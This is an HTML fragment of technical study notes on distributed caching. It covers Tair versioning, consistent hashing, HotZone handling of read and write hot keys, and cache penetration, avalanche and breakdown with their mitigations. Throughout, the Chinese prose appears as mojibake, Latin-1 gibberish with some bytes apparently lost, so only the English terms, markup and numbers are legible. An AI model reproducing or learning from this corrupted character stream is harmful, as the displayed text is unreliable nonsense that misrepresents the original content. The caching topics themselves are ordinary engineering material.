<li>versionï¼šä¸ºè§£å†³å¹¶å‘æ›´æ–°åŒä¸€ä¸ªæ•°æ®è€Œè®¾ç½®ã€‚å½“version=0æ—¶ï¼Œè¡¨ç¤ºå¼ºåˆ¶æ›´æ–°ï¼Œå½“versioné0æ—¶ï¼Œåˆ¤æ–­å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯å½“versionæ˜¯å¦ä¸€è‡´ï¼Œä¸ä¸€è‡´åˆ™è¿”å›ResultCode.VERERROR.</li>
<li>versionçš„å¢åŠ æ˜¯æœåŠ¡å™¨ç«¯çš„è¡Œä¸ºï¼Œtairå¹¶ä¸æ”¯æŒå¤šç‰ˆæœ¬æ•°æ®ã€‚å¦å¤–ï¼Œæ›´æ–°ä¹Ÿæ˜¯ä½¿ç”¨putæ¥å£ã€‚</li>
<li>versionçš„å€¼æ˜¯ç”±æœåŠ¡å™¨ç«¯å†³å®šçš„ï¼Œå’ŒclientæŒ‡å®šçš„versionå€¼æ— å…³ã€‚</li>
</ul>
<p><img src="@source/assets/cs-note/distribute/mk-2020-07-12-11-42-05.png" alt="" loading="lazy"></p>
<h2 id="è´Ÿè½½å‡è¡¡" tabindex="-1"> è´Ÿè½½å‡è¡¡</h2>
<p>åˆ†å¸ƒå¼è´Ÿè½½å‡è¡¡é‡‡ç”¨çš„æ˜¯ä¸€è‡´æ€§å“ˆå¸Œç®—æ³•</p>
<ol>
<li>å°†æœºå™¨æ ¹æ®hashå‡½æ•°æ˜ å°„åˆ°ç¯ä¸Šï¼›</li>
<li>å°†æ•°æ®æ¡¶æ ¹æ®hashå‡½æ•°æ˜ å°„åˆ°æ¢ä¸Šï¼›</li>
<li>æ®æ•°æ®æ˜ å°„åˆ°æ¡¶çš„ä½ç½®é¡ºæ—¶é’ˆæ‰¾åˆ°ç¬¬ä¸€å°æœºå™¨å°†è¯¥æ¡¶æ”¾åˆ°è¯¥æœºå™¨ä¸Šï¼›</li>
<li>å½“æŸå°æœºå™¨åæ‰æ—¶ï¼Œç±»ä¼¼(3)å°†å­˜å‚¨åœ¨è¯¥æœºå™¨ä¸Šçš„æ•°æ®é¡ºæ—¶é’ˆæ‰¾åˆ°ä¸‹ä¸€å°æœºå™¨ï¼›</li>
<li>å½“å¢åŠ æœºå™¨æ—¶ï¼Œå°†è¯¥æœºå™¨ä¸å‰ä¸€å°æœºå™¨(é€†æ—¶é’ˆ)ä¹‹é—´çš„æ¡¶å­˜å‚¨åœ¨æ–°å¢æœºå™¨ä¸Šå¹¶ä»åŸæ¥æœºå™¨ä¸Šç§»é™¤ã€‚</li>
</ol>
<ul>
<li>ä¼˜ç‚¹ï¼šç›¸æ¯”ç®€å•çš„å¯¹æœºå™¨æ•°å–æ¨¡ç®—æ³•ï¼Œå½“èŠ‚ç‚¹å˜åŠ¨çš„æ—¶å€™åªæœ‰ç›¸å¯¹è¾ƒå°‘çš„keyå¤±æ•ˆï¼Œå®ç°ä¹Ÿç›¸å¯¹ç®€å•ã€‚ä¸éœ€è¦è¿›è¡Œæ•°æ®è¿ç§»ï¼Œæ¯ä¸ªæœåŠ¡å™¨æ˜¯ç‹¬ç«‹çš„ã€‚</li>
<li>ç¼ºç‚¹ï¼šè¿˜æ˜¯ä¼šæœ‰éƒ¨åˆ†çš„keyå¤±æ•ˆï¼Œå¦‚æœè®¿é—®é‡éå¸¸å¤§çš„æ—¶å€™ï¼Œå¦‚æœè®¿é—®åˆ°å¤±æ•ˆçš„keyçš„æ—¶å€™ï¼Œå°±ä¼šç›´æ¥è®¿é—®åˆ°æ•°æ®æºä¸Šé¢å»äº†ï¼Œå¯èƒ½ä¼šå¯¼è‡´æ•°æ®æºç›´æ¥å‹æŒ‚ã€‚</li>
</ul>
<h2 id="å¤šçº§ç¼“å­˜" tabindex="-1"> å¤šçº§ç¼“å­˜</h2>
<p>é—®é¢˜èƒŒæ™¯</p>
<p>Tairæ˜¯ä¸€ä¸ªé«˜æ€§èƒ½ã€åˆ†å¸ƒå¼ã€å¯æ‰©å±•ã€é«˜å¯é çš„NoSQLå­˜å‚¨ç³»ç»Ÿï¼Œåœ¨é˜¿é‡Œå·´å·´é›†å›¢å†…éƒ¨æœ‰ç€å¤§é‡çš„éƒ¨ç½²å’Œä½¿ç”¨ã€‚ç”±äºTairçš„è®¿é—®æ–¹å¼æ˜¯å®¢æˆ·ç«¯å¯¹è¯·æ±‚çš„Keyè¿›è¡Œç±»ä¸€è‡´æ€§ Hash è®¡ç®—åï¼Œå†é€šè¿‡æ•°æ®è·¯ç”±è¡¨æŸ¥è¡¨å®šä½åˆ°æŸå°DataServerï¼ˆæ•°æ®èŠ‚ç‚¹æœåŠ¡å™¨ï¼‰è¿›è¡Œè¯»å†™çš„ï¼Œæ‰€ä»¥å¯¹ç›¸åŒKeyçš„è¯»å†™è¯·æ±‚å¿…ç„¶å›ºå®šæ˜ å°„åˆ°ç›¸åŒçš„DataServerä¸Šï¼Œå¦‚å›¾
<img src="@source/assets/cs-note/distribute/mk-2020-07-12-11-45-22.png" alt="" loading="lazy"></p>
<p>æ­¤æ—¶DataServerå•èŠ‚ç‚¹çš„è¯»å†™æ€§èƒ½ä¾¿æˆäº†å•Keyçš„è¯»å†™æ€§èƒ½ç“¶é¢ˆï¼Œä¸”æ— æ³•é€šè¿‡ç®€å•çš„æ°´å¹³æ‰©å±•æ¥è§£å†³ã€‚ç”±äºç”µå•†ç³»çš„ä¿ƒé”€æ´»åŠ¨å¤©ç„¶çš„å­˜åœ¨çƒ­ç‚¹æ•°æ®ï¼Œæ‰€ä»¥çƒ­ç‚¹æ•°æ®ç¼“å­˜çš„è¯»å†™èƒ½åŠ›å¯¹æ•´ä¸ªç¼“å­˜é›†ç¾¤çš„ç¨³å®šæ€§å’ŒæœåŠ¡èƒ½åŠ›éƒ½èµ·ç€è‡³å…³é‡è¦çš„ä½œç”¨ã€‚</p>
<h3 id="çƒ­ç‚¹è¯»å†™" tabindex="-1"> çƒ­ç‚¹è¯»å†™</h3>
<h4 id="çƒ­ç‚¹è¯†åˆ«" tabindex="-1"> çƒ­ç‚¹è¯†åˆ«</h4>
<p>DataServeræ”¶åˆ°å®¢æˆ·ç«¯çš„è¯·æ±‚åï¼Œç”±æ¯ä¸ªå…·ä½“å¤„ç†è¯·æ±‚çš„å·¥ä½œçº¿ç¨‹ï¼ˆWorker Threadï¼‰è¿›è¡Œè¯·æ±‚çš„ç»Ÿè®¡ã€‚å·¥ä½œçº¿ç¨‹ç”¨æ¥ç»Ÿè®¡çƒ­ç‚¹çš„æ•°æ®ç»“æ„å‡ä¸ºThreadLocalæ¨¡å¼çš„æ•°æ®ç»“æ„ï¼Œå®Œå…¨æ— é”åŒ–è®¾è®¡ã€‚çƒ­ç‚¹è¯†åˆ«ç®—æ³•ä½¿ç”¨ç²¾å¿ƒè®¾è®¡çš„å¤šçº§åŠ æƒLRUé“¾å’ŒHashMapç»„åˆçš„æ•°æ®ç»“æ„ï¼Œåœ¨ä¿è¯æœåŠ¡ç«¯è¯·æ±‚å¤„ç†æ•ˆç‡çš„å‰æä¸‹è¿›è¡Œè¯·æ±‚çš„å…¨ç»Ÿè®¡ï¼Œæ”¯æŒQPSçƒ­ç‚¹å’Œæµé‡çƒ­ç‚¹ï¼ˆå³è¯·æ±‚çš„QPSä¸å¤§ä½†æ˜¯æ•°æ®æœ¬èº«è¿‡å¤§è€Œé€ æˆçš„å¤§æµé‡æ‰€å½¢æˆçš„çƒ­ç‚¹ï¼‰çš„ç²¾å‡†è¯†åˆ«ã€‚æ¯ä¸ªé‡‡æ ·å‘¨æœŸç»“æŸæ—¶ï¼Œå·¥ä½œçº¿ç¨‹ä¼šå°†ç»Ÿè®¡çš„æ•°æ®ç»“æ„è½¬äº¤åˆ°åå°çš„ç»Ÿè®¡çº¿ç¨‹æ± è¿›è¡Œåˆ†æå¤„ç†ã€‚ç»Ÿè®¡å·¥ä½œå¼‚æ­¥åœ¨åå°è¿›è¡Œï¼Œä¸æŠ¢å æ­£å¸¸çš„æ•°æ®è¯·æ±‚çš„å¤„ç†èµ„æºã€‚</p>
<h4 id="è¯»çƒ­ç‚¹" tabindex="-1"> è¯»çƒ­ç‚¹</h4>
<ol>
<li>æœåŠ¡ç«¯è®¾è®¡</li>
</ol>
<p>ç›¸åŒKeyçš„è¯»å†™è¯·æ±‚å¿…ç„¶è½åœ¨å›ºå®šçš„DataServerä¸Šï¼Œä¸”æ— æ³•é€šè¿‡æ°´å¹³æ‰©å±•DataServeræ•°é‡æ¥è§£å†³ã€‚</p>
<p>é€šè¿‡åœ¨DataServerä¸Šåˆ’åˆ†ä¸€å—HotZoneå­˜å‚¨åŒºåŸŸçš„æ–¹å¼æ¥è§£å†³çƒ­ç‚¹æ•°æ®çš„è®¿é—®ã€‚è¯¥åŒºåŸŸå­˜å‚¨å½“å‰äº§ç”Ÿçš„æ‰€æœ‰è¯»çƒ­ç‚¹çš„æ•°æ®ï¼Œç”±å®¢æˆ·ç«¯é…ç½®çš„ç¼“å­˜è®¿é—®é€»è¾‘æ¥å¤„ç†å„çº§ç¼“å­˜çš„è®¿é—®ã€‚å¤šçº§ç¼“å­˜æ¶æ„å¦‚ä¸‹ï¼š</p>
<p><img src="@source/assets/cs-note/distribute/mk-2020-07-12-12-00-19.png" alt="" loading="lazy"></p>
<p>æ‰€æœ‰DataServerçš„HotZoneå­˜å‚¨åŒºåŸŸä¹‹é—´æ²¡æœ‰æƒé‡å…³ç³»ï¼Œæ¯ä¸ªHotZoneéƒ½å­˜å‚¨ç›¸åŒçš„è¯»çƒ­ç‚¹æ•°æ®ã€‚å®¢æˆ·ç«¯å¯¹çƒ­ç‚¹æ•°æ®Keyçš„è¯·æ±‚ä¼šéšæœºåˆ°ä»»æ„ä¸€å°DataServerçš„HotZoneåŒºåŸŸï¼Œè¿™æ ·å•ç‚¹çš„çƒ­ç‚¹è¯·æ±‚å°±è¢«æ•£åˆ—åˆ°å¤šä¸ªèŠ‚ç‚¹ä¹ƒè‡³æ•´ä¸ªé›†ç¾¤ã€‚</p>
<p>DataServerçš„HotZoneä½¿ç”¨ç‹¬ç«‹çš„ç½‘ç»œIOçº¿ç¨‹ä¸å·¥ä½œçº¿ç¨‹ï¼Œç›‘å¬ç‹¬ç«‹çš„çƒ­ç‚¹æ•°æ®è¯»å†™ç«¯å£ï¼Œå¹¶åˆå§‹åŒ–ç‹¬ç«‹çš„LocalTair æ¨¡å¼çš„Mdbå®ä¾‹ï¼Œè¿›è¡Œçƒ­ç‚¹æ•°æ®çš„å­˜å‚¨ã€‚ä½¿ç”¨ç‹¬ç«‹çš„Mdbå®ä¾‹çš„åŸå› æ˜¯è¯¥é€»è¾‘è¦åŒæ—¶å…¼å®¹Mdbå’ŒLdbå¼•æ“ï¼Œä¸ºäº†ä¸€å¥—ä»£ç é€šç”¨ï¼Œæ‰€ä»¥ä»IOçº¿ç¨‹åˆ°Workerçº¿ç¨‹å†åˆ°å…·ä½“çš„å¤„ç†çº¿ç¨‹éƒ½æ˜¯ç‹¬ç«‹çš„ä»£ç é€»è¾‘ï¼Œå¹¶ä½¿ç”¨ç‹¬ç«‹çš„Mdbå®ä¾‹è¿›è¡Œå­˜å‚¨ã€‚</p>
<p><img src="@source/assets/cs-note/distribute/mk-2020-07-12-11-57-09.png" alt="" loading="lazy"></p>
<ol start="2">
<li>å®¢æˆ·ç«¯è®¾è®¡</li>
</ol>
<p>å½“å®¢æˆ·ç«¯åœ¨ç¬¬ä¸€æ¬¡è¯·æ±‚å‰åˆå§‹åŒ–æ—¶ï¼Œä¼šè·å–æ•´ä¸ªTairé›†ç¾¤çš„èŠ‚ç‚¹ä¿¡æ¯ä»¥åŠå®Œæ•´çš„æ•°æ®è·¯ç”±è¡¨ï¼ŒåŒæ—¶ä¹Ÿä¼šè·å–é…ç½®çš„çƒ­ç‚¹æ•£åˆ—æœºå™¨æ•°ï¼ˆå³å®¢æˆ·ç«¯è®¿é—®çš„HotZoneçš„èŠ‚ç‚¹èŒƒå›´ï¼‰ã€‚éšåå®¢æˆ·ç«¯éšæœºé€‰æ‹©ä¸€ä¸ªHotZoneåŒºåŸŸä½œä¸ºè‡ªèº«å›ºå®šçš„è¯»å†™HotZoneåŒºåŸŸã€‚åœ¨DataServeræ•°é‡å’Œæ•£åˆ—æœºå™¨æ•°é…ç½®æœªå‘ç”Ÿå˜åŒ–çš„æƒ…å†µä¸‹ï¼Œä¸ä¼šæ”¹å˜é€‰æ‹©ã€‚å³æ¯ä¸ªå®¢æˆ·ç«¯åªè®¿é—®å”¯ä¸€çš„HotZoneåŒºåŸŸã€‚</p>
<h4 id="å†™çƒ­ç‚¹" tabindex="-1"> å†™çƒ­ç‚¹</h4>
<p>å¯¹äºå†™çƒ­ç‚¹ï¼Œå› ä¸ºä¸€è‡´æ€§çš„é—®é¢˜ï¼Œéš¾ä»¥ä½¿ç”¨å¤šçº§ç¼“å­˜çš„æ–¹å¼æ¥è§£å†³ã€‚</p>
<p>çƒ­ç‚¹Keyçš„å†™è¯·æ±‚åœ¨IOçº¿ç¨‹è¢«åˆ†å‘åˆ°ä¸“é—¨çš„çƒ­ç‚¹åˆå¹¶çº¿ç¨‹å¤„ç†ï¼Œè¯¥çº¿ç¨‹æ ¹æ®Keyå¯¹å†™è¯·æ±‚è¿›è¡Œä¸€å®šæ—¶é—´å†…çš„åˆå¹¶ï¼Œéšåç”±å®šæ—¶çº¿ç¨‹æŒ‰ç…§é¢„è®¾çš„åˆå¹¶å‘¨æœŸå°†åˆå¹¶åçš„è¯·æ±‚æäº¤åˆ°å¼•æ“å±‚ã€‚åˆå¹¶è¿‡ç¨‹ä¸­è¯·æ±‚ç»“æœæš‚æ—¶ä¸è¿”å›ç»™å®¢æˆ·ç«¯ï¼Œç­‰è¯·æ±‚åˆå¹¶å†™å…¥å¼•æ“æˆåŠŸåç»Ÿä¸€è¿”å›ã€‚è¿™æ ·åšä¸ä¼šæœ‰ä¸€è‡´æ€§çš„é—®é¢˜ï¼Œä¸ä¼šå‡ºç°å†™æˆåŠŸåå´è¯»åˆ°æ—§æ•°æ®ï¼Œä¹Ÿé¿å…äº†LDBé›†ç¾¤è¿”å›æˆåŠŸï¼Œæ•°æ®å¹¶æœªè½ç›˜çš„æƒ…å†µï¼ˆå‡å†™ï¼‰ã€‚å…·ä½“çš„åˆå¹¶å‘¨æœŸåœ¨æœåŠ¡ç«¯å¯é…ç½®ï¼Œå¹¶æ”¯æŒåŠ¨æ€ä¿®æ”¹ç”Ÿæ•ˆã€‚</p>
<h1 id="åˆ†å¸ƒå¼ç¼“å­˜é¢ä¸´çš„é—®é¢˜" tabindex="-1"> åˆ†å¸ƒå¼ç¼“å­˜é¢ä¸´çš„é—®é¢˜</h1>
<h2 id="ç¼“å­˜ä¸æ•°æ®åº“åŒå†™ä¸ä¸€è‡´" tabindex="-1"> ç¼“å­˜ä¸æ•°æ®åº“åŒå†™ä¸ä¸€è‡´</h2>
<p>ä¸€èˆ¬æ¥è¯´ï¼Œå¦‚æœå…è®¸ç¼“å­˜å¯ä»¥ç¨å¾®çš„è·Ÿæ•°æ®åº“å¶å°”æœ‰ä¸ä¸€è‡´çš„æƒ…å†µï¼Œä¹Ÿå°±æ˜¯è¯´å¦‚æœä½ çš„ç³»ç»Ÿä¸æ˜¯ä¸¥æ ¼è¦æ±‚ â€œç¼“å­˜+æ•°æ®åº“â€ å¿…é¡»ä¿æŒä¸€è‡´æ€§çš„è¯ï¼Œæœ€å¥½ä¸è¦åšè¿™ä¸ªæ–¹æ¡ˆï¼Œå³ï¼šè¯»è¯·æ±‚å’Œå†™è¯·æ±‚ä¸²è¡ŒåŒ–ï¼Œä¸²åˆ°ä¸€ä¸ªå†…å­˜é˜Ÿåˆ—é‡Œå»ã€‚</p>
<p>ä¸²è¡ŒåŒ–å¯ä»¥ä¿è¯ä¸€å®šä¸ä¼šå‡ºç°ä¸ä¸€è‡´çš„æƒ…å†µï¼Œä½†æ˜¯å®ƒä¹Ÿä¼šå¯¼è‡´ç³»ç»Ÿçš„ååé‡å¤§å¹…åº¦é™ä½ï¼Œç”¨æ¯”æ­£å¸¸æƒ…å†µä¸‹å¤šå‡ å€çš„æœºå™¨å»æ”¯æ’‘çº¿ä¸Šçš„ä¸€ä¸ªè¯·æ±‚ã€‚</p>
<h2 id="ç¼“å­˜ç©¿é€" tabindex="-1"> ç¼“å­˜ç©¿é€</h2>
<p>è®¿é—®ä¸€ä¸ªä¸å­˜åœ¨çš„ keyï¼Œç¼“å­˜ä¸èµ·ä½œç”¨ï¼Œè¯·æ±‚ä¼šç©¿é€åˆ° DBï¼Œæµé‡å¤§æ—¶ DB ä¼šæŒ‚æ‰ã€‚</p>
<p>ä¸¾ä¸ªæ —å­ã€‚ç³»ç»ŸAï¼Œæ¯ç§’ 5000 ä¸ªè¯·æ±‚ï¼Œç»“æœå…¶ä¸­ 4000 ä¸ªè¯·æ±‚æ˜¯é»‘å®¢å‘å‡ºçš„æ¶æ„æ”»å‡»ã€‚æ•°æ®åº“ id æ˜¯ä» 1 å¼€å§‹çš„ï¼Œè€Œé»‘å®¢å‘è¿‡æ¥çš„è¯·æ±‚ id å…¨éƒ¨éƒ½æ˜¯è´Ÿæ•°ã€‚è¿™æ ·çš„è¯ï¼Œç¼“å­˜ä¸­ä¸ä¼šæœ‰ï¼Œè¯·æ±‚æ¯æ¬¡éƒ½â€œè§†ç¼“å­˜äºæ— ç‰©â€ï¼Œç›´æ¥æŸ¥è¯¢æ•°æ®åº“ã€‚è¿™ç§æ¶æ„æ”»å‡»åœºæ™¯çš„ç¼“å­˜ç©¿é€å°±ä¼šç›´æ¥æŠŠæ•°æ®åº“ç»™æ‰“æ­»ã€‚</p>
<p><img src="@source/assets/cs-note/distribute/mk-2020-07-12-16-48-39.png" alt="" loading="lazy"></p>
<p>è§£å†³æ–¹æ¡ˆï¼š</p>
<ol>
<li>å¯¹æŸ¥è¯¢ç»“æœä¸ºç©ºçš„æƒ…å†µä¹Ÿè¿›è¡Œç¼“å­˜ï¼Œç¼“å­˜æ—¶é—´è®¾ç½®çŸ­ä¸€ç‚¹ï¼Œæˆ–è€…è¯¥ key å¯¹åº”çš„æ•°æ® insert ä¹‹åå†æ¸…ç†ç¼“å­˜ã€‚</li>
<li>å¯¹ä¸€å®šä¸å­˜åœ¨çš„ key è¿›è¡Œè¿‡æ»¤ã€‚å¯ä»¥æŠŠæ‰€æœ‰çš„å¯èƒ½å­˜åœ¨çš„keyæ”¾åˆ°ä¸€ä¸ªå¤§çš„Bitmapä¸­ï¼ŒæŸ¥è¯¢æ—¶é€šè¿‡è¯¥Bitmapè¿‡æ»¤ã€‚</li>
</ol>
<h2 id="ç¼“å­˜é›ªå´©" tabindex="-1"> ç¼“å­˜é›ªå´©</h2>
<p>å¯¹äºç³»ç»Ÿ Aï¼Œå‡è®¾æ¯å¤©é«˜å³°æœŸæ¯ç§’ 5000 ä¸ªè¯·æ±‚ï¼Œæœ¬æ¥ç¼“å­˜åœ¨é«˜å³°æœŸå¯ä»¥æ‰›ä½æ¯ç§’ 4000 ä¸ªè¯·æ±‚ï¼Œä½†æ˜¯ç¼“å­˜æœºå™¨æ„å¤–å‘ç”Ÿäº†å…¨ç›˜å®•æœºã€‚ç¼“å­˜æŒ‚äº†ï¼Œæ­¤æ—¶ 1 ç§’ 5000 ä¸ªè¯·æ±‚å…¨éƒ¨è½æ•°æ®åº“ï¼Œæ•°æ®åº“å¿…ç„¶æ‰›ä¸ä½ï¼Œå®ƒä¼šæŠ¥ä¸€ä¸‹è­¦ï¼Œç„¶åå°±æŒ‚äº†ã€‚æ­¤æ—¶ï¼Œå¦‚æœæ²¡æœ‰é‡‡ç”¨ä»€ä¹ˆç‰¹åˆ«çš„æ–¹æ¡ˆæ¥å¤„ç†è¿™ä¸ªæ•…éšœï¼ŒDBA å¾ˆç€æ€¥ï¼Œé‡å¯æ•°æ®åº“ï¼Œä½†æ˜¯æ•°æ®åº“ç«‹é©¬åˆè¢«æ–°çš„æµé‡ç»™æ‰“æ­»äº†ã€‚</p>
<p><img src="@source/assets/cs-note/distribute/mk-2020-07-12-16-49-58.png" alt="" loading="lazy"></p>
<p>è§£å†³æ–¹æ¡ˆï¼š</p>
<ol>
<li>åœ¨ç¼“å­˜å¤±æ•ˆåï¼Œé€šè¿‡åŠ é”æˆ–è€…é˜Ÿåˆ—æ¥æ§åˆ¶è¯»æ•°æ®åº“å†™ç¼“å­˜çš„çº¿ç¨‹æ•°é‡ã€‚æ¯”å¦‚å¯¹æŸä¸ª key åªå…è®¸ä¸€ä¸ªçº¿ç¨‹æŸ¥è¯¢æ•°æ®å’Œå†™ç¼“å­˜ï¼Œå…¶ä»–çº¿ç¨‹ç­‰å¾…ã€‚</li>
<li>ä¸åŒçš„ keyï¼Œè®¾ç½®ä¸åŒçš„è¿‡æœŸæ—¶é—´ï¼Œè®©ç¼“å­˜å¤±æ•ˆçš„æ—¶é—´ç‚¹å°½é‡å‡åŒ€ã€‚</li>
<li>åšäºŒçº§ç¼“å­˜ï¼ŒA1 ä¸ºåŸå§‹ç¼“å­˜ï¼ŒA2ä¸ºæ‹·è´ç¼“å­˜ï¼ŒA1 å¤±æ•ˆæ—¶ï¼Œå¯ä»¥è®¿é—® A2ï¼ŒA1 ç¼“å­˜å¤±æ•ˆæ—¶é—´è®¾ç½®ä¸ºçŸ­æœŸï¼ŒA2 è®¾ç½®ä¸ºé•¿æœŸï¼ˆæ­¤ç‚¹ä¸ºè¡¥å……ï¼‰</li>
</ol>
<p>ç¼“å­˜é›ªå´©çš„äº‹å‰äº‹ä¸­äº‹åçš„è§£å†³æ–¹æ¡ˆå¦‚ä¸‹ï¼š</p>
<p>äº‹å‰ï¼šRedis é«˜å¯ç”¨ï¼Œä¸»ä»+å“¨å…µï¼ŒRedis clusterï¼Œé¿å…å…¨ç›˜å´©æºƒã€‚
äº‹ä¸­ï¼šæœ¬åœ° ehcache ç¼“å­˜ + hystrix é™æµ&amp;é™çº§ï¼Œé¿å… MySQL è¢«æ‰“æ­»ã€‚
äº‹åï¼šRedis æŒä¹…åŒ–ï¼Œä¸€æ—¦é‡å¯ï¼Œè‡ªåŠ¨ä»ç£ç›˜ä¸ŠåŠ è½½æ•°æ®ï¼Œå¿«é€Ÿæ¢å¤ç¼“å­˜æ•°æ®ã€‚</p>
<p><img src="@source/assets/cs-note/distribute/mk-2020-07-12-16-59-15.png" alt="" loading="lazy"></p>
<p>ç”¨æˆ·å‘é€ä¸€ä¸ªè¯·æ±‚ï¼Œç³»ç»Ÿ A æ”¶åˆ°è¯·æ±‚åï¼Œå…ˆæŸ¥æœ¬åœ° ehcache ç¼“å­˜ï¼Œå¦‚æœæ²¡æŸ¥åˆ°å†æŸ¥ Redisã€‚å¦‚æœ ehcache å’Œ Redis éƒ½æ²¡æœ‰ï¼Œå†æŸ¥æ•°æ®åº“ï¼Œå°†æ•°æ®åº“ä¸­çš„ç»“æœï¼Œå†™å…¥ ehcache å’Œ Redis ä¸­ã€‚</p>
<p>é™æµç»„ä»¶ï¼Œå¯ä»¥è®¾ç½®æ¯ç§’çš„è¯·æ±‚ï¼Œæœ‰å¤šå°‘èƒ½é€šè¿‡ç»„ä»¶ï¼Œå‰©ä½™çš„æœªé€šè¿‡çš„è¯·æ±‚ï¼Œæ€ä¹ˆåŠï¼Ÿèµ°é™çº§ï¼å¯ä»¥è¿”å›ä¸€äº›é»˜è®¤çš„å€¼ï¼Œæˆ–è€…å‹æƒ…æç¤ºï¼Œæˆ–è€…ç©ºå€¼ã€‚</p>
<p>å¥½å¤„ï¼š</p>
<ul>
<li>æ•°æ®åº“ç»å¯¹ä¸ä¼šæ­»ï¼Œé™æµç»„ä»¶ç¡®ä¿äº†æ¯ç§’åªæœ‰å¤šå°‘ä¸ªè¯·æ±‚èƒ½é€šè¿‡ã€‚</li>
<li>åªè¦æ•°æ®åº“ä¸æ­»ï¼Œå°±æ˜¯è¯´ï¼Œå¯¹ç”¨æˆ·æ¥è¯´ï¼Œ2/5 çš„è¯·æ±‚éƒ½æ˜¯å¯ä»¥è¢«å¤„ç†çš„ã€‚</li>
<li>åªè¦æœ‰ 2/5 çš„è¯·æ±‚å¯ä»¥è¢«å¤„ç†ï¼Œå°±æ„å‘³ç€ä½ çš„ç³»ç»Ÿæ²¡æ­»ï¼Œå¯¹ç”¨æˆ·æ¥è¯´ï¼Œå¯èƒ½å°±æ˜¯ç‚¹å‡»å‡ æ¬¡åˆ·ä¸å‡ºæ¥é¡µé¢ï¼Œä½†æ˜¯å¤šç‚¹å‡ æ¬¡ï¼Œå°±å¯ä»¥åˆ·å‡ºæ¥äº†</li>
</ul>
<h2 id="ç¼“å­˜å‡»ç©¿" tabindex="-1"> ç¼“å­˜å‡»ç©¿</h2>
<p>æŸä¸ª key éå¸¸çƒ­ç‚¹ï¼Œè®¿é—®éå¸¸é¢‘ç¹ï¼Œå¤„äºé›†ä¸­å¼é«˜å¹¶å‘è®¿é—®çš„æƒ…å†µï¼Œå½“è¿™ä¸ª key åœ¨å¤±æ•ˆçš„ç¬é—´ï¼Œå¤§é‡çš„è¯·æ±‚å°±å‡»ç©¿äº†ç¼“å­˜ï¼Œç›´æ¥è¯·æ±‚æ•°æ®åº“ï¼Œå°±åƒæ˜¯åœ¨ä¸€é“å±éšœä¸Šå‡¿å¼€äº†ä¸€ä¸ªæ´ã€‚</p>
<p>è§£å†³æ–¹æ¡ˆï¼š</p>
<ol>
<li>ä½¿ç”¨äº’æ–¥é” (mutex key)ï¼šæ„ŸçŸ¥åˆ°ç¼“å­˜å¤±æ•ˆï¼Œå»æŸ¥è¯¢ DB æ—¶ï¼Œä½¿ç”¨åˆ†å¸ƒå¼é”ï¼Œä½¿å¾—åªæœ‰ä¸€ä¸ªçº¿ç¨‹å»æ•°æ®åº“åŠ è½½æ•°æ®ï¼ŒåŠ é”å¤±è´¥çš„çº¿ç¨‹ï¼Œç­‰å¾…å³å¯ã€‚</li>
<li>æ‰‹åŠ¨è¿‡æœŸï¼šredis ä¸Šä»ä¸è®¾ç½®è¿‡æœŸæ—¶é—´ï¼ŒåŠŸèƒ½ä¸Šå°†è¿‡æœŸæ—¶é—´å­˜åœ¨ key å¯¹åº”çš„ value é‡Œï¼Œå¦‚æœå‘ç°è¦è¿‡æœŸï¼Œé€šè¿‡ä¸€ä¸ªåå°çš„å¼‚æ­¥çº¿ç¨‹è¿›è¡Œç¼“å­˜çš„æ„å»ºï¼Œä¹Ÿå°±æ˜¯â€œæ‰‹åŠ¨â€è¿‡æœŸã€‚</li>
</ol>
<p>ä¸åŒåœºæ™¯ä¸‹çš„è§£å†³æ–¹å¼å¯å¦‚ä¸‹ï¼š</p>
<ul>
<li>è‹¥ç¼“å­˜çš„æ•°æ®æ˜¯åŸºæœ¬ä¸ä¼šå‘ç”Ÿæ›´æ–°çš„ï¼Œåˆ™å¯å°è¯•å°†è¯¥çƒ­ç‚¹æ•°æ®è®¾ç½®ä¸ºæ°¸ä¸è¿‡æœŸã€‚</li>
<li>è‹¥ç¼“å­˜çš„æ•°æ®æ›´æ–°ä¸é¢‘ç¹ï¼Œä¸”ç¼“å­˜åˆ·æ–°çš„æ•´ä¸ªæµç¨‹è€—æ—¶è¾ƒå°‘çš„æƒ…å†µä¸‹ï¼Œåˆ™å¯ä»¥é‡‡ç”¨åŸºäº Redisã€zookeeper ç­‰åˆ†å¸ƒå¼ä¸­é—´ä»¶çš„åˆ†å¸ƒå¼äº’æ–¥é”ï¼Œæˆ–è€…æœ¬åœ°äº’æ–¥é”ä»¥ä¿è¯ä»…å°‘é‡çš„è¯·æ±‚èƒ½è¯·æ±‚æ•°æ®åº“å¹¶é‡æ–°æ„å»ºç¼“å­˜ï¼Œå…¶ä½™çº¿ç¨‹åˆ™åœ¨é”é‡Šæ”¾åèƒ½è®¿é—®åˆ°æ–°ç¼“å­˜ã€‚</li>
<li>è‹¥ç¼“å­˜çš„æ•°æ®æ›´æ–°é¢‘ç¹æˆ–è€…åœ¨ç¼“å­˜åˆ·æ–°çš„æµç¨‹è€—æ—¶è¾ƒé•¿çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥åˆ©ç”¨å®šæ—¶çº¿ç¨‹åœ¨ç¼“å­˜è¿‡æœŸå‰ä¸»åŠ¨åœ°é‡æ–°æ„å»ºç¼“å­˜æˆ–è€…å»¶åç¼“å­˜çš„è¿‡æœŸæ—¶é—´ï¼Œä»¥ä¿è¯æ‰€æœ‰çš„è¯·æ±‚èƒ½ä¸€ç›´è®¿é—®åˆ°å¯¹åº”çš„ç¼“å­˜ã€‚</li>
</ul>
<h2 id="ç¼“å­˜å¹¶å‘ç«äº‰" tabindex="-1"> ç¼“å­˜å¹¶å‘ç«äº‰</h2>
<p>æŸä¸ªæ—¶åˆ»ï¼Œå¤šä¸ªç³»ç»Ÿå®ä¾‹éƒ½å»æ›´æ–°æŸä¸ª keyã€‚å¯ä»¥åŸºäº zookeeper å®ç°åˆ†å¸ƒå¼é”ã€‚æ¯ä¸ªç³»ç»Ÿé€šè¿‡ zookeeper è·å–åˆ†å¸ƒå¼é”ï¼Œç¡®ä¿åŒä¸€æ—¶é—´ï¼Œåªèƒ½æœ‰ä¸€ä¸ªç³»ç»Ÿå®ä¾‹åœ¨æ“ä½œæŸä¸ª keyï¼Œåˆ«äººéƒ½ä¸å…è®¸è¯»å’Œå†™ã€‚</p>
<p><img src="@source/assets/cs-note/distribute/mk-2020-07-12-17-11-50.png" alt="" loading="lazy"></p>
